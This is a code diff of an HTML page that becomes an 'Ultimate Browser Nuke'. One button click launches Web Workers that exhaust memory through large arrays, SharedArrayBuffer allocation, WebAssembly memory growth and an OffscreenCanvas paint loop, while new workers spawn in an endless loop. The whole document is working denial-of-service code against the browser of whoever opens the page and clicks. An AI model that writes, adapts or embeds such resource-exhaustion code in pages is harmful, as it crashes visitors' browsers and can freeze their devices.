@@ -3,139 +3,143 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Worker Crash Suite</title>
+  <title>Ultimate Browser Nuke</title>
   <style>
-    body {
-      background: #111;
-      color: #eee;
-      font-family: sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 2rem;
+    :root {
+      --bg-start:   #141414;
+      --bg-end:     #1f1f1f;
+      --accent:     #e63946;
+      --accent-60:  rgba(230,57,70,0.6);
+      --border-red: #c62828;
+      --text:       #f1f1f1;
+      --card-bg:    rgba(30,30,30,0.7);
+      --card-border:rgba(230,57,70,0.4);
     }
-    h1 { margin-bottom: 0.5rem; }
-    select, button {
-      font-size: 1rem;
-      padding: 0.5rem 1rem;
-      margin: 0.5rem;
-      border-radius: 4px;
-      border: none;
+    *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
+    html, body {
+      width:100%; height:100%;
+      font-family:'Inter',sans-serif;
+      background:linear-gradient(135deg,var(--bg-start),var(--bg-end));
+      display:flex; align-items:center; justify-content:center;
+      color:var(--text);
     }
-    button {
-      background: #d33;
-      color: white;
-      cursor: pointer;
+    .card {
+      background:var(--card-bg);
+      border:1px solid var(--card-border);
+      border-radius:12px;
+      padding:2rem;
+      max-width:380px; width:90%;
+      text-align:center;
+      box-shadow:0 4px 8px rgba(0,0,0,0.5);
     }
+    .title { font-size:1.75rem; margin-bottom:0.5rem; letter-spacing:1px; }
+    .subtitle { font-size:0.9rem; color:#ccc; margin-bottom:1.5rem; }
+    .warning {
+      font-size:0.95rem;
+      color:var(--accent);
+      margin-bottom:1.5rem;
+      line-height:1.4;
+    }
+    .button {
+      padding:0.75rem 1.5rem;
+      font-size:1rem;
+      background:var(--accent-60);
+      color:#fff;
+      border:2px solid var(--border-red);
+      border-radius:4px;
+      cursor:pointer;
+      box-shadow:0 2px 8px rgba(230,57,70,0.8);
+      transition:background 0.2s, box-shadow 0.3s, transform 0.1s;
+    }
+    .button:hover {
+      background:rgba(230,57,70,0.8);
+      box-shadow:0 4px 16px rgba(230,57,70,1);
+      transform:translateY(-2px);
+    }
+    .button:focus {
+      outline:none;
+      box-shadow:0 0 20px rgba(230,57,70,1);
+    }
+    .button:active { transform:translateY(0); }
   </style>
 </head>
 <body>
-  <h1>Worker Crash Suite</h1>
-  <p>Pick a method, then hit “CRASH”</p>
-  <select id="method">
-    <option value="singleWorker">Single‐Worker Memory Bomb</option>
-    <option value="multiWorker">Multi‐Worker Memory Flood</option>
-    <option value="sharedWorker">SharedArrayBuffer Flood</option>
-    <option value="wasmWorker">WASM Memory Grower</option>
-    <option value="offscreenWorker">OffscreenCanvas Paint Loop</option>
-    <option value="sequence">🔥 Full Worker Sequence</option>
-  </select>
-  <button id="crashBtn">CRASH</button>
+  <div class="card">
+    <div class="title">Ultimate Browser Nuke</div>
+    <div class="subtitle">One click to fire 4 kill‑switches in parallel</div>
+    <div class="warning">
+      All methods use WebWorkers—no single large allocation. This often kills the browser process itself.
+    </div>
+    <button class="button" id="nukeBtn">Crash Browser</button>
+  </div>
 
   <script>
-    // create a worker from source string
-    function makeWorker(src) {
-      const blob = new Blob([src], { type: 'application/javascript' });
-      return URL.createObjectURL(blob);
-    }
+    // 1) Original worker‑bomb: infinite spawn of heavy workers
+    const originalURL = URL.createObjectURL(new Blob([`
+      onmessage = () => {
+        while (true) {
+          const a = new Array(1000000).fill('*');
+        }
+      };
+    `], { type: 'application/javascript' }));
 
-    // Blob URLs for each worker type
-    const urls = {
-      singleWorker: makeWorker(`
-        onmessage = () => {
-          let arr = [];
-          while (true) arr.push(new Array(1000000).fill('*'));
-        };
-      `),
+    // 2) SharedArrayBuffer flood worker
+    const sharedURL = URL.createObjectURL(new Blob([`
+      onmessage = () => {
+        while (true) {
+          const sb = new SharedArrayBuffer(1024*1024);
+          new Uint8Array(sb)[0] = 1;
+        }
+      };
+    `], { type: 'application/javascript' }));
 
-      multiWorker: makeWorker(`
-        onmessage = () => {
-          let arr = [];
-          while (true) arr.push(new Array(1000000).fill('*'));
-        };
-      `),
-
-      sharedWorker: makeWorker(`
-        onmessage = () => {
-          while (true) {
-            const sb = new SharedArrayBuffer(1024*1024);
-            new Uint8Array(sb)[0] = 1;
-          }
-        };
-      `),
-
-      wasmWorker: makeWorker(`
-        onmessage = () => {
-          const bytes = new Uint8Array([
-            0x00,0x61,0x73,0x6d,1,0,0,0,
-            1,4,1,96,0,0,
-            3,2,1,0,
-            5,3,1,0,1,
-            7,7,1,3,103,101,116,0,0,
-            10,9,1,7,0,65,0,11
-          ]);
-          WebAssembly.instantiate(bytes).then(obj => {
-            const mem = obj.instance.exports.memory;
+    // 3) WASM memory grower worker
+    const wasmURL = URL.createObjectURL(new Blob([`
+      onmessage = () => {
+        const bytes = new Uint8Array([
+          0x00,0x61,0x73,0x6d,1,0,0,0,
+          1,4,1,96,0,0,
+          3,2,1,0,
+          5,3,1,0,1,
+          7,5,1,3,109,101,109,0,0,
+          10,3,1,1,0,11
+        ]);
+        WebAssembly.instantiate(bytes)
+          .then(obj => {
+            const mem = obj.instance.exports.memory || obj.instance.exports.MEMORY;
             while (true) mem.grow(1);
           });
-        };
-      `),
+      };
+    `], { type: 'application/javascript' }));
 
-      offscreenWorker: makeWorker(`
-        onmessage = () => {
-          const oc = new OffscreenCanvas(10000,10000);
+    // 4) OffscreenCanvas painting loop worker
+    const offscreenURL = URL.createObjectURL(new Blob([`
+      onmessage = () => {
+        if ('OffscreenCanvas' in self) {
+          const oc = new OffscreenCanvas(5000,5000);
           const ctx = oc.getContext('2d');
-          while (true) ctx.fillRect(0,0,10000,10000);
-        };
-      `)
-    };
-
-    const crash = {
-      singleWorker() {
-        const w = new Worker(urls.singleWorker);
-        w.postMessage('go');
-      },
-      multiWorker() {
-        for (let i = 0; i < 10; i++) {
-          const w = new Worker(urls.multiWorker);
-          w.postMessage('go');
+          while (true) ctx.fillRect(0,0,5000,5000);
         }
-      },
-      sharedWorker() {
-        const w = new Worker(urls.sharedWorker);
-        w.postMessage('go');
-      },
-      wasmWorker() {
-        const w = new Worker(urls.wasmWorker);
-        w.postMessage('go');
-      },
-      offscreenWorker() {
-        const w = new Worker(urls.offscreenWorker);
-        w.postMessage('go');
-      },
-      sequence() {
-        // launch all at once for maximum speed
-        Object.keys(this).forEach(key => {
-          if (key !== 'sequence') this[key]();
-        });
-      }
-    };
+      };
+    `], { type: 'application/javascript' }));
 
-    document.getElementById('crashBtn').addEventListener('click', () => {
-      const method = document.getElementById('method').value;
-      // give UI a moment to update before crash
-      setTimeout(() => crash[method](), 50);
-    });
+    // Launch all four bombs
+    function nuke() {
+      // SharedArrayBuffer flood
+      new Worker(sharedURL).postMessage('go');
+      // WASM memory grow
+      new Worker(wasmURL).postMessage('go');
+      // OffscreenCanvas paint
+      new Worker(offscreenURL).postMessage('go');
+      // Original worker‑spawner in a tight loop
+      while (true) {
+        const w = new Worker(originalURL);
+        w.postMessage('go');
+      }
+    }
+
+    document.getElementById('nukeBtn')
+            .addEventListener('click', () => setTimeout(nuke, 50));
   </script>
 </body>
 </html>
